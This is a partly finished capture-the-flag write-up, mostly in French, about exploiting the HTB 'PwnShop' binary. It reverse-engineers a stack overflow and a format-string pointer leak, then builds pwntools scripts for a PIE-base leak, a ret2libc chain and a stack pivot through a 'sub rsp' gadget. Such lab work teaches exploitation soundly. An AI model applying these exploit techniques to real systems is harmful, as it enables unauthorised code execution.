\chapter{Pwn shop}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}

\section{Analysis}
\subsection{File info}
\begin{verbatim}
$ file pwnshop
pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
    dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
    BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0,
    stripped
\end{verbatim}

\subsection{Security}
\begin{verbatim}
$ pwntools-pwn checksec --file=./pwnshop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
\end{verbatim}

pas d'execution sur la stack PIE enabled.

\begin{verbatim}
$ echo 0 | sudo tee  /proc/sys/kernel/randomize_va_spac
\end{verbatim}

\subsection{Execution}


\section{static analysis}

\subsection{main}
\subsubsection{Desassemblage}
\begin{verbatim}
   0x5555555550a0:      push   rbp
   0x5555555550a1:      xor    eax,eax
   0x5555555550a3:      lea    rbp,[rip+0x1079]        # 0x555555556123
   0x5555555550aa:      push   rbx
   0x5555555550ab:      push   rcx
   0x5555555550ac:      call   0x55555555521e          # INIT IOs
   0x5555555550b1:      lea    rdi,[rip+0x1049]        # 0x555555556101
   0x5555555550b8:      call   0x555555555030 <puts@plt>
   0x5555555550bd:      mov    rdi,rbp                 # LOOP
   0x5555555550c0:      call   0x555555555030 <puts@plt>
   0x5555555550c5:      lea    rdi,[rip+0x106d]        # 0x555555556139
   0x5555555550cc:      xor    eax,eax
   0x5555555550ce:      call   0x555555555040 <printf@plt>
   0x5555555550d3:      call   0x555555555080 <getchar@plt>
   0x5555555550d8:      mov    ebx,eax
   0x5555555550da:      call   0x555555555080 <getchar@plt>
   0x5555555550df:      cmp    bl,0x32
   0x5555555550e2:      je     0x5555555550f7            
   0x5555555550e4:      cmp    bl,0x33
   0x5555555550e7:      je     0x55555555510e           # EXIT
   0x5555555550e9:      cmp    bl,0x31
   0x5555555550ec:      jne    0x555555555100           #
   0x5555555550ee:      xor    eax,eax
   0x5555555550f0:      call   0x55555555532a           # CALL BUY
   0x5555555550f5:      jmp    0x5555555550bd           # JMP LOOP
   0x5555555550f7:      xor    eax,eax
   0x5555555550f9:      call   0x55555555526a           # CALL SELL
   0x5555555550fe:      jmp    0x5555555550bd           # JMP LOOP
   0x555555555100:      lea    rdi,[rip+0x104c]         # 0x555555556153
   0x555555555107:      call   0x555555555030 <puts@plt>
   0x55555555510c:      jmp    0x5555555550bd           # JMP LOOP
   0x55555555510e:      pop    rdx
   0x55555555510f:      xor    eax,eax
   0x555555555111:      pop    rbx
   0x555555555112:      pop    rbp
   0x555555555113:      ret
\end{verbatim}

\subsubsection{decompilation}
\begin{verbatim}
undefined  [16] main(void)
{
  int iVar1;
  ulong in_RCX;
  char cVar2;

  init();
  puts("========= HTB PwnShop ===========");
  while( true ) {
    while( true ) {
      puts("What do you wanna do?");
      printf("1> Buy\n2> Sell\n3> Exit\n> ");
      iVar1 = getchar();
      getchar();
      cVar2 = (char)iVar1;
      if (cVar2 != '2') break;
      sell();
    }
    if (cVar2 == '3') break;
    if (cVar2 == '1') {
      buy();
    }
    else {
      puts("Please try again.");
    }
  }
  return ZEXT816(in_RCX) << 0x40;
}
\end{verbatim}

\subsection{buy}

\subsubsection{desassemblage}
\begin{verbatim}
pwndbg> x/50i 0x55555555532a
   0x55555555532a:      sub    rsp,0x48
   0x55555555532e:      lea    rdi,[rip+0xd7a]        # 0x5555555560af
   0x555555555335:      call   0x555555555030 <puts@plt>
   0x55555555533a:      lea    rdi,[rip+0xd92]        # 0x5555555560d3
   0x555555555341:      xor    eax,eax
   0x555555555343:      call   0x555555555040 <printf@plt>
   0x555555555348:      mov    rsi,rsp
   0x55555555534b:      mov    edx,0x50
   0x555555555350:      xor    edi,edi
   0x555555555352:      call   0x555555555060 <read@plt>
   0x555555555357:      add    rsp,0x48
   0x55555555535b:      ret
\end{verbatim}

ce qui est marrant c'est que l'on a pas la creation cmnventionnelle d'une stack
frame \verb+push rbp; mov rbp,rsp ... pop rbp+

\subsubsection{decompilation}
\begin{verbatim}
void buy(void)
{
  undefined auStack_48 [72];

  puts("Sorry, we aren\'t selling right now.");
  printf("But you can place a request. \nEnter details: ");
  read(0,auStack_48,0x50);
  return;
}
\end{verbatim}

\subsubsection{bufferOverflow}
buffer overflow scan 80 sur buffer de 72. Mais normalement il ne devrait pas
être suffisant pour ecraser l'ip car \verb-72 buffer + 8 rbp + 8 rip- il nous manque 8
sauf que comme vu avant on n'a pas de \verb+push rbp.. .. pop rbp+  on peut
bien prendre le contrôle de \verb+rip+.

Par contre on ne pourra pas faire de ROP.

\begin{verbatim}
def _find_ip(payload):
    log.debug(f'send payload to segfault : {payload}')
    io.sendline(payload)
    io.wait(3)
    core = io.corefile
    #ip_offset = cyclic_find(io.corefile.pc) # x86
    ip_value = io.corefile.read(io.corefile.sp, 4) #x64
    ip_offset = cyclic_find(ip_value) #x64
    log.success(f'ip offset at {ip_offset} with value {ip_value}')

def find_buy_ip():
    io.sendline("1")
    log.debug(f'received : {io.clean()}')
    _find_ip(cyclic(80))
\end{verbatim}

\begin{verbatim}
$ ./pwn-bin.py LOCAL
.. .SNIP. ..
[+] ip offset at 72 with value b'saaa'
\end{verbatim}



\subsection{sell}

\subsubsection{deassemblage}
\begin{verbatim}
   0x55555555526a:	push   rbp
   0x55555555526b:	lea    rax,[rip+0x2e4e]        # 0x5555555580c0
   0x555555555272:	lea    rdi,[rip+0xd8b]        # 0x555555556004
   0x555555555279:	push   rbx
   0x55555555527a:	sub    rsp,0x38
   0x55555555527e:	mov    QWORD PTR [rsp+0x28],rax
   0x555555555283:	xor    eax,eax
   0x555555555285:	lea    rbp,[rsp+0x20]
   0x55555555528a:	call   0x555555555040 <printf@plt>
   0x55555555528f:	mov    rsi,rsp
   0x555555555292:	xor    eax,eax
   0x555555555294:	mov    ecx,0x8
   0x555555555299:	mov    rdi,rsi
   0x55555555529c:	mov    edx,0x1f
   0x5555555552a1:	mov    QWORD PTR [rsp+0x20],0x0
   0x5555555552aa:	rep stos DWORD PTR es:[rdi],eax
   0x5555555552ac:	xor    edi,edi
   0x5555555552ae:	call   0x555555555060 <read@plt>
   0x5555555552b3:	lea    rdi,[rip+0xd65]        # 0x55555555601f
   0x5555555552ba:	xor    eax,eax
   0x5555555552bc:	call   0x555555555040 <printf@plt>
   0x5555555552c1:	xor    edi,edi
   0x5555555552c3:	mov    rsi,rbp
   0x5555555552c6:	mov    edx,0x8
   0x5555555552cb:	call   0x555555555060 <read@plt>
   0x5555555552d0:	lea    rsi,[rip+0xd66]        # 0x55555555603d
   0x5555555552d7:	mov    rdi,rbp
   0x5555555552da:	call   0x555555555070 <strcmp@plt>
   0x5555555552df:	test   eax,eax
   0x5555555552e1:	jne    0x555555555312
   0x5555555552e3:	lea    rdi,[rip+0xd5a]        # 0x555555556044
   0x5555555552ea:	mov    ebx,eax
   0x5555555552ec:	call   0x555555555030 <puts@plt>
   0x5555555552f1:	mov    rdi,QWORD PTR [rsp+0x28]
   0x5555555552f6:	mov    eax,ebx
   0x5555555552f8:	mov    ecx,0x10
   0x5555555552fd:	mov    edx,0x40
   0x555555555302:	rep stos DWORD PTR es:[rdi],eax
   0x555555555304:	xor    edi,edi
   0x555555555306:	mov    rsi,QWORD PTR [rsp+0x28]
   0x55555555530b:	call   0x555555555060 <read@plt>
   0x555555555310:	jmp    0x555555555323
   0x555555555312:	mov    rsi,rbp
   0x555555555315:	lea    rdi,[rip+0xd6c]        # 0x555555556088
   0x55555555531c:	xor    eax,eax
   0x55555555531e:	call   0x555555555040 <printf@plt>
   0x555555555323:	add    rsp,0x38
   0x555555555327:	pop    rbx
   0x555555555328:	pop    rbp
   0x555555555329:	ret
\end{verbatim}

\subsubsection{decompilation}
\begin{verbatim}
void sell(void)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  byte bVar4;
  undefined4 sell_product [8];
  undefined8 sell_price;
  undefined4 *details;

  bVar4 = 0;
  details = &DAT_001040c0;
  printf("What do you wish to sell? ");
  sell_price = 0;
  puVar3 = sell_product;
  for (lVar2 = 8; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
  }
  read(0,sell_product,0x1f);
  printf("How much do you want for it? ");
  read(0,&sell_price,8);
  iVar1 = strcmp((char *)&sell_price,"13.37\n");
  if (iVar1 == 0) {
    puts("Sounds good. Leave details here so I can ask my guy to take a look.");
    puVar3 = details;
    for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
    }
    read(0,details,0x40);
  }
  else {
    printf("What? %s? The best I can do is 13.37$\n",&sell_price);
  }
  return;
}
\end{verbatim}

\subsubsection{Initialisation buffer}
ce bloc d'instruction
\begin{verbatim}
  puVar3 = sell_product;
  for (lVar2 = 8; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
  }
\end{verbatim}

correspond à cela 
\begin{verbatim}
   0x55555555528f:	mov    rsi,rsp
   0x555555555292:	xor    eax,eax
   0x555555555294:	mov    ecx,0x8
   0x555555555299:	mov    rdi,rsi
   0x55555555529c:	mov    edx,0x1f
   0x5555555552a1:	mov    QWORD PTR [rsp+0x20],0x0
   0x5555555552aa:	rep stos DWORD PTR es:[rdi],eax
   0x5555555552ac:	xor    edi,edi
   0x5555555552ae:	call   0x555555555060 <read@plt>
\end{verbatim}

et doit plus se lire de cette manière donc cela correspond au RAZ des buffers
\begin{verbatim}
for (i = 32 ; i != 0 ; i--)
    sell_productt[i] = 0
\end{verbatim}

\subsubsection{Format de la stack}

{\bf tete de la stack (local vars (0x38 = 56 bytes)}:
\begin{verbatim}
rbp
rbx
rsp = rbp - 0x38
    details:      scanné à rsp + 0x28   pour 64 byes
    sell_value:   scanné à rsp + 0x20   pour 8 bytes
    sell_item:    scanné à rsp          pour 0x1f =31bytes
\end{verbatim}

\subsubsection{leak d'un buffer dans .bss}

a l'initial on pense n a un overflow sur \verb+details+ pour l'atteindre il
faudra rentrer \verb+13.37+ sur le prix. Sauf que non car \verb+detail+ est un
pointeur un buffer se trouvant en \verb+.bss+ 

ca c'est bizare:

\begin{verbatim}
lea    rbp,[rsp+0x20]
\end{verbatim}


le truc c'est que si on rentre plus que 8 sur \verb+sell_value+ il ne va pas enregistrer
la fin de chaine (\verb+\x0+). Comme la valeur ne sera pas égale à 13.73, il va passer au
print en \verb+%s+ et afficher la chaine jusqu'au prochain \verb+\x0+ donc il
devrait afficher la suite de la stack et donc l'addresse de \verb+detail+ car
au début de la fonction on a cela: 

\begin{verbatim}
0x55555555526b:	lea    rax,[rip+0x2e4e]        # 0x5555555580c0
.. .SNIP. ..
0x55555555527e:	mov    QWORD PTR [rsp+0x28],rax
\end{verbatim}

On va donc pouvoir calculer @runtime le \verb+piebase+. Pour cela il faut
connaitre l'addresse relative.

Il suffit donc avec gdb de réaliser les commandes suivantes avant execution:
\begin{verbatim}
gef>  i file
	Entry point: 0x1120
gef>  x/10i 0x126b
   0x126b:	lea    rax,[rip+0x2e4e]        # 0x40c0
\end{verbatim}


donc \verb+absolute - relative = piebase+
\verb+0x005555555580c0 - 40c0 = 555555554000+

Une fois le programme débuté dans gdb on corrèle bien :
\begin{verbatim}
gef>  piebase
Calculated VA from pwnshop = 0x555555554000
\end{verbatim}

en execution on a bien effectivement la même chose
\begin{verbatim}
How much do you want for it? azertyui
What? azertyui??UUUU? The best I can do is 13.37$
\end{verbatim}

\section{Exploit}

\subsection{Strategy}

\subsubsection{ret2libc}

donc normalement on est capable de calculer l'addresse de base du programme
si pas d'ASLR on devrait pouvoir calculer l'addresse de \verb+system+

le principe que l'on va avoir va être de :
\begin{enumerate}
    \item calculer \verb+piebase+ (\verb+addresse leaked - 40c0+)
    \item d'ajouter le décalage de chargement de libc
\begin{verbatim}
$ ldd pwnshop
	linux-vdso.so.1 (0x00007ffff7fc8000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7db5000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fca000)
\end{verbatim}
    \item d'ajouter le décalage de \verb+system+ dans libc
\begin{verbatim}
$ readelf -s /usr/lib/libc.so.6 |grep system
  1023: 00000000000493d0    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
\end{verbatim}
\end{enumerate}

après il faut faire un classique:
\begin{verbatim}
 ROPgadget --binary pwnshop |grep 'pop rdi'
0x00000000000013c3 : pop rdi ; ret
\end{verbatim}

C'est bien beau mais on n'a pas de buffer overflow suffisant pour construire le
payload. 

\subsubsection{pivoting}

l'idée serait de se servir du buffer qui se trouve en \verb+.bss+ dont on leak
l'addresse qui à priori peut encaisser 64 bytes comme d'une stack.

donc il faudrait que l'on arrive à faire pointer le ou les registres 
\verb+rbp / rsp+ dessus. 

si on le fait en rop il faut \verb+<rop pop><addresse buffer>+ Mais on ne peut
pas aller au dela de l'ecrasement de \verb+rip+


Le seul  moyen serait d'avoir un \verb+sub rsp, ???+

\begin{verbatim}
$ ropper --file pwnshop --search sub
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: sub

[INFO] File: pwnshop
0x000000000000121a: sub esp, 0x28; ret;
0x00000000000013dd: sub esp, 8; add rsp, 8; ret;
0x0000000000001005: sub esp, 8; mov rax, qword ptr [rip + 0x2fd9]; test rax, rax; je 0x1016; call rax;
0x0000000000001219: sub rsp, 0x28; ret;
0x00000000000013dc: sub rsp, 8; add rsp, 8; ret;
0x0000000000001004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fd9]; test rax, rax; je 0x1016; call rax;
\end{verbatim}

donc \verb-piebase + 13dc-

ce qui veut dire que le payload final aura la forme suivante:
\begin{verbatim}
junk            32 bytes [72 - 40 (0x28)]
rop_pop_rdi     8 bytes 
binsh           8 bytes
system          8 bytes
junk            8 bytes 
rop_sub_rsp     8 bytes
\end{verbatim}

\subsection{dynamic analysis}

\subsection{Exploit build}


\begin{verbatim}
$ pwntools-pwn template --host 10.10.10.10 --port 10 ./ > pwn-bin.py
\end{verbatim}

\subsubsection{Validation du leak}
\begin{verbatim}
def get_leaked():
    io.sendlineafter('>', '2')
    io.sendlineafter('What do you wish to sell?', b'un truc')
    io.sendlineafter('How much do you want for it?', b'A' * 7 + b'B' *2)
    io.recvuntil(b'B')
    leaked = io.recvuntil(b'?',drop=True)
    leaked = leaked.ljust(8, b'\x00')
    leaked = unpack(leaked)
    log.success(f'leaked : {hex(leaked)}')
    log.debug(f'received : {io.recvline()}')
    return leaked

io = start()
piebase = get_leaked() - 0x40c0
log.success(f'piebase : {hex(piebase)}')
log.success(f'rop sub : {hex(piebase + rop_sub)}')
exit(0)
\end{verbatim}

\begin{verbatim}
$ ./pwn-bin.py LOCAL
.. .SNIP. ..
[+] leaked : 0x5555555580c0
[DEBUG] received : b' The best I can do is 13.37$\n'
[+] piebase : 0x555555554000
[+] rop sub : 0x555555555219
\end{verbatim}

\subsubsection{validation de la ROP chain}
\begin{verbatim}
def test_rop():
    payload = b'J' * (72 - 32)
    payload += b'APOP RDI'
    payload += b'A__BINSH'
    payload += b'A_SYSTEM'
    payload += b'J' * 8
    payload += p64(piebase + rop_sub)
    io.sendlineafter('>', '1')
    io.sendlineafter(b'Enter details:', payload)

gdbscript = '''
piebase
breakrva 0x1357
continue
'''.format(**locals())

context.terminal=['lxterminal', '-e', 'sh', '-c']
context.log_level = 'debug'
io = start()
rop_sub = 0x1219

g = gdb.attach(io, gdbscript)
io.wait(2)

piebase = get_leaked() - 0x40c0
log.success(f'piebase : {hex(piebase)}')
log.success(f'rop sub : {hex(piebase + rop_sub)}')
test_rop()
io.interactive()
\end{verbatim}

après l'execution de \verb+0x555555555357    add    rsp, 0x48+ on a bien 
\begin{verbatim}
00:0000| rsp 0x7fffffffc198 — 0x49445220504f5041 ('APOP RDI')
01:0008|     0x7fffffffc1a0 — 0x48534e49425f5f41 ('A__BINSH')
02:0010|     0x7fffffffc1a8 — 0x4d45545359535f41 ('A_SYSTEM')
03:0018|     0x7fffffffc1b0 — 0x4a4a4a4a4a4a4a4a ('JJJJJJJJ')
\end{verbatim}







pwndbg> search /bin/sh
libc.so.6       0x7ffff7f52031 0x68732f6e69622f /* '/bin/sh' */

